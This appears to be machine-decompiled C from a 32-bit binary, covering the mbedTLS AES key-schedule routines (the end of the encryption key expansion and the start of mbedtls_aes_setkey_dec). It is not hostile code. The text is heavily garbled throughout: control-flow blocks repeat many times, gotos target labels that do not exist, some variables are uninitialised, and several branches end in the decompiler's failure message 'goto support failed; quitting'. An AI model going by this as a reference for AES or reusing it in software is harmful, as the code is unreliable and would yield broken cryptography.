                    *(int32_t *)(v36 + 20) = v86;
                    v37 = v11;
                    v87 = *(int32_t *)(v37 - 8) ^ v86;
                    *(int32_t *)(v37 + 24) = v87;
                    v38 = v11;
                    v88 = *(int32_t *)(v38 - 4) ^ v87;
                    g4 = v88;
                    *(int32_t *)(v38 + 28) = v88;
                    if (v12 != 7) {
                        goto lab_0x804aa38_5;
                    }
                    // 0x804ab00
                    // branch -> 0x804a936
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
            }
        } else {
            v16 = g7;
        }
    } else {
        // 0x804a86d
        if (a3 == 192) {
            // 0x804a973
            v18 = g190;
            *(int32_t *)v1 = 12;
            if (v18 == -1) {
                // 0x804a98a
                v10 = mbedtls_padlock_has_support(192, 0);
                g190 = v10;
                v15 = v10;
                // branch -> 0x804a8b7
            } else {
                // 0x804a973
                v15 = v18;
                // branch -> 0x804a8b7
            }
            // 0x804a8b7
            v13 = v1;
            if (v15 == 0) {
                // 0x804a940
                v6 = v13 + 8;
                v11 = v6;
                *(int32_t *)(v13 + 4) = v6;
                // branch -> 0x804a8d1
            } else {
                // 0x804a8bf
                v4 = v13 + 24 & -16;
                v11 = v4;
                *(int32_t *)(v13 + 4) = v4;
                // branch -> 0x804a8d1
            }
            // 0x804a8d1
            v21 = g7;
            if (v21 >= 32) {
                // 0x804a8db
                v63 = 0;
                v64 = 4 * v63;
                v20 = g3;
                v76 = *(char *)(v20 + 1 + v64);
                v77 = *(char *)(v20 + 2 + v64);
                v78 = *(char *)(v20 + 3 + v64);
                v75 = 4 * v63;
                v65 = *(char *)(v75 + v20);
                *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
                v5 = 1;
                // branch -> 0x804a8e0
                while (v21 / 32 > v5) {
                    // 0x804a8e0
                    v63 = v5;
                    v64 = 4 * v63;
                    v20 = g3;
                    v76 = *(char *)(v20 + 1 + v64);
                    v77 = *(char *)(v20 + 2 + v64);
                    v78 = *(char *)(v20 + 3 + v64);
                    v75 = 4 * v63;
                    v65 = *(char *)(v75 + v20);
                    *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
                    v5++;
                    // continue -> 0x804a8e0
                }
                // 0x804a914
                v14 = v1;
                g4 = v14;
                v17 = *(int32_t *)v14;
                if (v17 == 12) {
                    // 0x804ab08
                    v40 = 0;
                    // branch -> 0x804ab10
                    while (true) {
                        // 0x804ab10
                        v39 = v11;
                        v9 = v39 + 24;
                        v11 = v9;
                        v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
                        v12 = v40 + 1;
                        v68 = *(int32_t *)(v39 + 20);
                        v73 = *(int32_t *)v39;
                        v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
                        v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
                        v61 = *(char *)(v68 % 256 + (int32_t)&g199);
                        v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
                        v74 = 256 * (int32_t)v62;
                        g4 = v74;
                        v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
                        *(int32_t *)v9 = v41;
                        v42 = v11;
                        v90 = *(int32_t *)(v42 - 20) ^ v41;
                        *(int32_t *)(v42 + 4) = v90;
                        v43 = v11;
                        v91 = *(int32_t *)(v43 - 16) ^ v90;
                        *(int32_t *)(v43 + 8) = v91;
                        v44 = v11;
                        v92 = *(int32_t *)(v44 - 12) ^ v91;
                        *(int32_t *)(v44 + 12) = v92;
                        v45 = v11;
                        v93 = *(int32_t *)(v45 - 8) ^ v92;
                        *(int32_t *)(v45 + 16) = v93;
                        v46 = v11;
                        *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
                        if (v12 != 8) {
                            goto lab_0x804ab10_5;
                        }
                        // 0x804ab89
                        // branch -> 0x804a936
                        // 0x804a936
                        g3 = v3;
                        g7 = v2;
                        return 0;
                    }
                } else {
                    // 0x804a922
                    if (v17 != 14) {
                        // 0x804a92b
                        if (v17 == 10) {
                            // 0x804a9b0
                            v23 = 0;
                            // branch -> 0x804a9b8
                            while (true) {
                                // 0x804a9b8
                                v22 = v11;
                                v7 = v22 + 16;
                                v11 = v7;
                                v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                                v12 = v23 + 1;
                                v66 = *(int32_t *)(v22 + 12);
                                v69 = *(int32_t *)v22;
                                v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                                v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                                v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                                v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                                v70 = 256 * (int32_t)v50;
                                g4 = v70;
                                v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                                *(int32_t *)v7 = v24;
                                v25 = v11;
                                v80 = *(int32_t *)(v25 - 12) ^ v24;
                                *(int32_t *)(v25 + 4) = v80;
                                v26 = v11;
                                v81 = *(int32_t *)(v26 - 8) ^ v80;
                                *(int32_t *)(v26 + 8) = v81;
                                v27 = v11;
                                *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                                if (v12 != 10) {
                                    goto lab_0x804a9b8_5;
                                }
                                // 0x804aa25
                                // branch -> 0x804a936
                                // 0x804a936
                                g3 = v3;
                                g7 = v2;
                                return 0;
                            }
                        }
                        // 0x804a936
                        g3 = v3;
                        g7 = v2;
                        return 0;
                    }
                    // 0x804aa30
                    v29 = 0;
                    // branch -> 0x804aa38
                    while (true) {
                        // 0x804aa38
                        v28 = v11;
                        v8 = v28 + 32;
                        v11 = v8;
                        v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                        v12 = v29 + 1;
                        v67 = *(int32_t *)(v28 + 28);
                        v71 = *(int32_t *)v28;
                        v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                        v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                        v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                        v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                        v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                        *(int32_t *)v8 = v30;
                        v31 = v11;
                        v83 = *(int32_t *)(v31 - 28) ^ v30;
                        *(int32_t *)(v31 + 4) = v83;
                        v32 = v11;
                        v84 = *(int32_t *)(v32 - 24) ^ v83;
                        *(int32_t *)(v32 + 8) = v84;
                        v33 = v11;
                        v85 = *(int32_t *)(v33 - 20) ^ v84;
                        *(int32_t *)(v33 + 12) = v85;
                        v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                        v56 = *(char *)(v85 % 256 | 0x8082400);
                        v34 = v11;
                        v72 = *(int32_t *)(v34 - 16);
                        v19 = v85;
                        v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                        v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                        v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                        *(int32_t *)(v34 + 16) = v35;
                        v36 = v11;
                        v86 = *(int32_t *)(v36 - 12) ^ v35;
                        *(int32_t *)(v36 + 20) = v86;
                        v37 = v11;
                        v87 = *(int32_t *)(v37 - 8) ^ v86;
                        *(int32_t *)(v37 + 24) = v87;
                        v38 = v11;
                        v88 = *(int32_t *)(v38 - 4) ^ v87;
                        g4 = v88;
                        *(int32_t *)(v38 + 28) = v88;
                        if (v12 != 7) {
                            goto lab_0x804aa38_5;
                        }
                        // 0x804ab00
                        // branch -> 0x804a936
                        // 0x804a936
                        g3 = v3;
                        g7 = v2;
                        return 0;
                    }
                }
            }
            // 0x804a914
            v14 = v1;
            g4 = v14;
            v17 = *(int32_t *)v14;
            if (v17 == 12) {
                // 0x804ab08
                v40 = 0;
                // branch -> 0x804ab10
                while (true) {
                    // 0x804ab10
                    v39 = v11;
                    v9 = v39 + 24;
                    v11 = v9;
                    v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
                    v12 = v40 + 1;
                    v68 = *(int32_t *)(v39 + 20);
                    v73 = *(int32_t *)v39;
                    v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
                    v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
                    v61 = *(char *)(v68 % 256 + (int32_t)&g199);
                    v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
                    v74 = 256 * (int32_t)v62;
                    g4 = v74;
                    v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
                    *(int32_t *)v9 = v41;
                    v42 = v11;
                    v90 = *(int32_t *)(v42 - 20) ^ v41;
                    *(int32_t *)(v42 + 4) = v90;
                    v43 = v11;
                    v91 = *(int32_t *)(v43 - 16) ^ v90;
                    *(int32_t *)(v43 + 8) = v91;
                    v44 = v11;
                    v92 = *(int32_t *)(v44 - 12) ^ v91;
                    *(int32_t *)(v44 + 12) = v92;
                    v45 = v11;
                    v93 = *(int32_t *)(v45 - 8) ^ v92;
                    *(int32_t *)(v45 + 16) = v93;
                    v46 = v11;
                    *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
                    if (v12 != 8) {
                        goto lab_0x804ab10_5;
                    }
                    // 0x804ab89
                    // branch -> 0x804a936
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
            } else {
                // 0x804a922
                if (v17 != 14) {
                    // 0x804a92b
                    if (v17 == 10) {
                        // 0x804a9b0
                        v23 = 0;
                        // branch -> 0x804a9b8
                        while (true) {
                            // 0x804a9b8
                            v22 = v11;
                            v7 = v22 + 16;
                            v11 = v7;
                            v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                            v12 = v23 + 1;
                            v66 = *(int32_t *)(v22 + 12);
                            v69 = *(int32_t *)v22;
                            v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                            v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                            v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                            v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                            v70 = 256 * (int32_t)v50;
                            g4 = v70;
                            v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                            *(int32_t *)v7 = v24;
                            v25 = v11;
                            v80 = *(int32_t *)(v25 - 12) ^ v24;
                            *(int32_t *)(v25 + 4) = v80;
                            v26 = v11;
                            v81 = *(int32_t *)(v26 - 8) ^ v80;
                            *(int32_t *)(v26 + 8) = v81;
                            v27 = v11;
                            *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                            if (v12 != 10) {
                                goto lab_0x804a9b8_5;
                            }
                            // 0x804aa25
                            // branch -> 0x804a936
                            // 0x804a936
                            g3 = v3;
                            g7 = v2;
                            return 0;
                        }
                    }
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
                // 0x804aa30
                v29 = 0;
                // branch -> 0x804aa38
                while (true) {
                    // 0x804aa38
                    v28 = v11;
                    v8 = v28 + 32;
                    v11 = v8;
                    v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                    v12 = v29 + 1;
                    v67 = *(int32_t *)(v28 + 28);
                    v71 = *(int32_t *)v28;
                    v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                    v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                    v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                    v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                    v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                    *(int32_t *)v8 = v30;
                    v31 = v11;
                    v83 = *(int32_t *)(v31 - 28) ^ v30;
                    *(int32_t *)(v31 + 4) = v83;
                    v32 = v11;
                    v84 = *(int32_t *)(v32 - 24) ^ v83;
                    *(int32_t *)(v32 + 8) = v84;
                    v33 = v11;
                    v85 = *(int32_t *)(v33 - 20) ^ v84;
                    *(int32_t *)(v33 + 12) = v85;
                    v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                    v56 = *(char *)(v85 % 256 | 0x8082400);
                    v34 = v11;
                    v72 = *(int32_t *)(v34 - 16);
                    v19 = v85;
                    v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                    v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                    v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                    *(int32_t *)(v34 + 16) = v35;
                    v36 = v11;
                    v86 = *(int32_t *)(v36 - 12) ^ v35;
                    *(int32_t *)(v36 + 20) = v86;
                    v37 = v11;
                    v87 = *(int32_t *)(v37 - 8) ^ v86;
                    *(int32_t *)(v37 + 24) = v87;
                    v38 = v11;
                    v88 = *(int32_t *)(v38 - 4) ^ v87;
                    g4 = v88;
                    *(int32_t *)(v38 + 28) = v88;
                    if (v12 != 7) {
                        goto lab_0x804aa38_5;
                    }
                    // 0x804ab00
                    // branch -> 0x804a936
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
            }
        } else {
            v16 = a3;
        }
    }
    // 0x804a879
    if (v16 == 256) {
        // 0x804a9a0
        *(int32_t *)v1 = 14;
        // branch -> 0x804a8a9
    } else {
        // 0x804a885
        if (v16 != 128) {
            // 0x804a892
            g3 = v3;
            g7 = v2;
            return -32;
        }
        // 0x804a8a0
        *(int32_t *)v1 = 10;
        // branch -> 0x804a8a9
    }
    int32_t v94 = g190; // 0x804a8a9
    v15 = v94;
    if (v94 == -1) {
        // 0x804a98a
        v10 = mbedtls_padlock_has_support(192, 0);
        g190 = v10;
        v15 = v10;
        // branch -> 0x804a8b7
    }
    // 0x804a8b7
    v13 = v1;
    if (v15 == 0) {
        // 0x804a940
        v6 = v13 + 8;
        v11 = v6;
        *(int32_t *)(v13 + 4) = v6;
        // branch -> 0x804a8d1
    } else {
        // 0x804a8bf
        v4 = v13 + 24 & -16;
        v11 = v4;
        *(int32_t *)(v13 + 4) = v4;
        // branch -> 0x804a8d1
    }
    // 0x804a8d1
    v21 = g7;
    if (v21 >= 32) {
        // 0x804a8db
        v63 = 0;
        v64 = 4 * v63;
        v20 = g3;
        v76 = *(char *)(v20 + 1 + v64);
        v77 = *(char *)(v20 + 2 + v64);
        v78 = *(char *)(v20 + 3 + v64);
        v75 = 4 * v63;
        v65 = *(char *)(v75 + v20);
        *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
        v5 = 1;
        // branch -> 0x804a8e0
        while (v21 / 32 > v5) {
            // 0x804a8e0
            v63 = v5;
            v64 = 4 * v63;
            v20 = g3;
            v76 = *(char *)(v20 + 1 + v64);
            v77 = *(char *)(v20 + 2 + v64);
            v78 = *(char *)(v20 + 3 + v64);
            v75 = 4 * v63;
            v65 = *(char *)(v75 + v20);
            *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
            v5++;
            // continue -> 0x804a8e0
        }
        // 0x804a914
        v14 = v1;
        g4 = v14;
        v17 = *(int32_t *)v14;
        if (v17 == 12) {
            // 0x804ab08
            v40 = 0;
            // branch -> 0x804ab10
            while (true) {
                // 0x804ab10
                v39 = v11;
                v9 = v39 + 24;
                v11 = v9;
                v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
                v12 = v40 + 1;
                v68 = *(int32_t *)(v39 + 20);
                v73 = *(int32_t *)v39;
                v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
                v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
                v61 = *(char *)(v68 % 256 + (int32_t)&g199);
                v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
                v74 = 256 * (int32_t)v62;
                g4 = v74;
                v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
                *(int32_t *)v9 = v41;
                v42 = v11;
                v90 = *(int32_t *)(v42 - 20) ^ v41;
                *(int32_t *)(v42 + 4) = v90;
                v43 = v11;
                v91 = *(int32_t *)(v43 - 16) ^ v90;
                *(int32_t *)(v43 + 8) = v91;
                v44 = v11;
                v92 = *(int32_t *)(v44 - 12) ^ v91;
                *(int32_t *)(v44 + 12) = v92;
                v45 = v11;
                v93 = *(int32_t *)(v45 - 8) ^ v92;
                *(int32_t *)(v45 + 16) = v93;
                v46 = v11;
                *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
                if (v12 != 8) {
                    goto lab_0x804ab10_5;
                }
                // 0x804ab89
                // branch -> 0x804a936
                // 0x804a936
                g3 = v3;
                g7 = v2;
                return 0;
            }
        } else {
            // 0x804a922
            if (v17 == 14) {
                // 0x804aa30
                v29 = 0;
                // branch -> 0x804aa38
                while (true) {
                    // 0x804aa38
                    v28 = v11;
                    v8 = v28 + 32;
                    v11 = v8;
                    v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                    v12 = v29 + 1;
                    v67 = *(int32_t *)(v28 + 28);
                    v71 = *(int32_t *)v28;
                    v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                    v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                    v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                    v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                    v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                    *(int32_t *)v8 = v30;
                    v31 = v11;
                    v83 = *(int32_t *)(v31 - 28) ^ v30;
                    *(int32_t *)(v31 + 4) = v83;
                    v32 = v11;
                    v84 = *(int32_t *)(v32 - 24) ^ v83;
                    *(int32_t *)(v32 + 8) = v84;
                    v33 = v11;
                    v85 = *(int32_t *)(v33 - 20) ^ v84;
                    *(int32_t *)(v33 + 12) = v85;
                    v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                    v56 = *(char *)(v85 % 256 | 0x8082400);
                    v34 = v11;
                    v72 = *(int32_t *)(v34 - 16);
                    v19 = v85;
                    v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                    v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                    v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                    *(int32_t *)(v34 + 16) = v35;
                    v36 = v11;
                    v86 = *(int32_t *)(v36 - 12) ^ v35;
                    *(int32_t *)(v36 + 20) = v86;
                    v37 = v11;
                    v87 = *(int32_t *)(v37 - 8) ^ v86;
                    *(int32_t *)(v37 + 24) = v87;
                    v38 = v11;
                    v88 = *(int32_t *)(v38 - 4) ^ v87;
                    g4 = v88;
                    *(int32_t *)(v38 + 28) = v88;
                    if (v12 != 7) {
                        goto lab_0x804aa38_5;
                    }
                    // 0x804ab00
                    // branch -> 0x804a936
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
            } else {
                // 0x804a92b
                if (v17 == 10) {
                    // 0x804a9b0
                    v23 = 0;
                    // branch -> 0x804a9b8
                    while (true) {
                        // 0x804a9b8
                        v22 = v11;
                        v7 = v22 + 16;
                        v11 = v7;
                        v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                        v12 = v23 + 1;
                        v66 = *(int32_t *)(v22 + 12);
                        v69 = *(int32_t *)v22;
                        v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                        v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                        v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                        v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                        v70 = 256 * (int32_t)v50;
                        g4 = v70;
                        v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                        *(int32_t *)v7 = v24;
                        v25 = v11;
                        v80 = *(int32_t *)(v25 - 12) ^ v24;
                        *(int32_t *)(v25 + 4) = v80;
                        v26 = v11;
                        v81 = *(int32_t *)(v26 - 8) ^ v80;
                        *(int32_t *)(v26 + 8) = v81;
                        v27 = v11;
                        *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                        if (v12 != 10) {
                            goto lab_0x804a9b8_5;
                        }
                        // 0x804aa25
                        // branch -> 0x804a936
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x804a914
    v14 = v1;
    g4 = v14;
    v17 = *(int32_t *)v14;
    if (v17 == 12) {
        // 0x804ab08
        v40 = 0;
        // branch -> 0x804ab10
        while (true) {
            // 0x804ab10
            v39 = v11;
            v9 = v39 + 24;
            v11 = v9;
            v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
            v12 = v40 + 1;
            v68 = *(int32_t *)(v39 + 20);
            v73 = *(int32_t *)v39;
            v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
            v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
            v61 = *(char *)(v68 % 256 + (int32_t)&g199);
            v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
            v74 = 256 * (int32_t)v62;
            g4 = v74;
            v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
            *(int32_t *)v9 = v41;
            v42 = v11;
            v90 = *(int32_t *)(v42 - 20) ^ v41;
            *(int32_t *)(v42 + 4) = v90;
            v43 = v11;
            v91 = *(int32_t *)(v43 - 16) ^ v90;
            *(int32_t *)(v43 + 8) = v91;
            v44 = v11;
            v92 = *(int32_t *)(v44 - 12) ^ v91;
            *(int32_t *)(v44 + 12) = v92;
            v45 = v11;
            v93 = *(int32_t *)(v45 - 8) ^ v92;
            *(int32_t *)(v45 + 16) = v93;
            v46 = v11;
            *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
            if (v12 != 8) {
                goto lab_0x804ab10_5;
            }
            // 0x804ab89
            // branch -> 0x804a936
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
    } else {
        // 0x804a922
        if (v17 == 14) {
            // 0x804aa30
            v29 = 0;
            // branch -> 0x804aa38
            while (true) {
                // 0x804aa38
                v28 = v11;
                v8 = v28 + 32;
                v11 = v8;
                v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                v12 = v29 + 1;
                v67 = *(int32_t *)(v28 + 28);
                v71 = *(int32_t *)v28;
                v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                *(int32_t *)v8 = v30;
                v31 = v11;
                v83 = *(int32_t *)(v31 - 28) ^ v30;
                *(int32_t *)(v31 + 4) = v83;
                v32 = v11;
                v84 = *(int32_t *)(v32 - 24) ^ v83;
                *(int32_t *)(v32 + 8) = v84;
                v33 = v11;
                v85 = *(int32_t *)(v33 - 20) ^ v84;
                *(int32_t *)(v33 + 12) = v85;
                v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                v56 = *(char *)(v85 % 256 | 0x8082400);
                v34 = v11;
                v72 = *(int32_t *)(v34 - 16);
                v19 = v85;
                v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                *(int32_t *)(v34 + 16) = v35;
                v36 = v11;
                v86 = *(int32_t *)(v36 - 12) ^ v35;
                *(int32_t *)(v36 + 20) = v86;
                v37 = v11;
                v87 = *(int32_t *)(v37 - 8) ^ v86;
                *(int32_t *)(v37 + 24) = v87;
                v38 = v11;
                v88 = *(int32_t *)(v38 - 4) ^ v87;
                g4 = v88;
                *(int32_t *)(v38 + 28) = v88;
                if (v12 != 7) {
                    goto lab_0x804aa38_5;
                }
                // 0x804ab00
                // branch -> 0x804a936
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
        } else {
            // 0x804a92b
            if (v17 == 10) {
                // 0x804a9b0
                v23 = 0;
                // branch -> 0x804a9b8
                while (true) {
                    // 0x804a9b8
                    v22 = v11;
                    v7 = v22 + 16;
                    v11 = v7;
                    v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                    v12 = v23 + 1;
                    v66 = *(int32_t *)(v22 + 12);
                    v69 = *(int32_t *)v22;
                    v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                    v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                    v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                    v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                    v70 = 256 * (int32_t)v50;
                    g4 = v70;
                    v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                    *(int32_t *)v7 = v24;
                    v25 = v11;
                    v80 = *(int32_t *)(v25 - 12) ^ v24;
                    *(int32_t *)(v25 + 4) = v80;
                    v26 = v11;
                    v81 = *(int32_t *)(v26 - 8) ^ v80;
                    *(int32_t *)(v26 + 8) = v81;
                    v27 = v11;
                    *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                    if (v12 != 10) {
                        goto lab_0x804a9b8_5;
                    }
                    // 0x804aa25
                    // branch -> 0x804a936
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x804ab90 - 0x804ad7f
int32_t mbedtls_aes_setkey_dec(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g7; // 0x804ab94
    int32_t v2 = g3; // 0x804ab95
    g7 = (int32_t)a1;
    int32_t v3;
    int32_t v4 = &v3; // 0x804ab9f_0
    mbedtls_aes_init((char *)&v3);
    int32_t v5 = g190; // 0x804abad
    int32_t v6 = v5; // 0x804abbb
    if (v5 == -1) {
        // 0x804ad5e
        int32_t v7;
        int32_t v8 = mbedtls_padlock_has_support(192, v7); // 0x804ad65
        g190 = v8;
        v6 = v8;
        // branch -> 0x804abbb
    }
    int32_t v9 = g7; // 0x804ad53
    int32_t v10 = v9 + 8; // 0x804ad53
    g3 = v10;
    if (v6 == 0) {
        // 0x804ad53
        *(int32_t *)(v9 + 4) = v10;
        // branch -> 0x804abcf
    } else {
        int32_t v11 = v9 + 24 & -16; // 0x804abc9
        g3 = v11;
        *(int32_t *)(v9 + 4) = v11;
        // branch -> 0x804abcf
    }
    int32_t result = mbedtls_aes_setkey_enc(&v3, a2, a3); // 0x804abe6
    if (result == 0) {
        *(int32_t *)g7 = v3;
        int32_t v12;
        int32_t v13 = 16 * v3 + v12; // 0x804ac04
        int32_t v14 = v13; // eax
        *(int32_t *)g3 = *(int32_t *)v13;
        *(int32_t *)(g3 + 4) = *(int32_t *)(v14 + 4);
        *(int32_t *)(g3 + 8) = *(int32_t *)(v14 + 8);
        int32_t v15 = v14; // 0x804ac1a
        int32_t v16 = v15 - 16; // 0x804ac1d
        int32_t v17 = v16; // edi
        *(int32_t *)(g3 + 12) = *(int32_t *)(v15 + 12);
        int32_t v18 = *(int32_t *)g7; // 0x804ac2b
        int32_t v19 = g3 + 16; // 0x804ac2d
        int32_t v20 = v18 - 1; // 0x804ac38
        int32_t v21 = v19; // esi
        int32_t v22 = v16; // 0x804ad1a32
        int32_t v23 = v19; // 0x804ad2331
        if (v20 >= 1) {
            int32_t v24 = v19; // 0x804aca946
            int32_t v25 = v20; // 0x804acba33
            while (true) {
                int32_t v26 = 0; // 0x804ac5a
                uint32_t v27 = *(int32_t *)(v26 + v17); // 0x804ac5a
                unsigned char v28 = *(char *)(v27 % 256 + (int32_t)&g199); // 0x804ac65
                unsigned char v29 = *(char *)(v27 / 0x1000000 + (int32_t)&g199); // 0x804ac6c
                int32_t v30 = *(int32_t *)(4 * (int32_t)v29 + (int32_t)&g209); // 0x804ac73
                int32_t v31 = *(int32_t *)(4 * (int32_t)v28 + (int32_t)&g206); // 0x804ac7a
                unsigned char v32 = *(char *)(v27 / 256 % 256 + (int32_t)&g199); // 0x804ac87
                unsigned char v33 = *(char *)(v27 / 0x10000 % 256 + (int32_t)&g199); // 0x804ac94
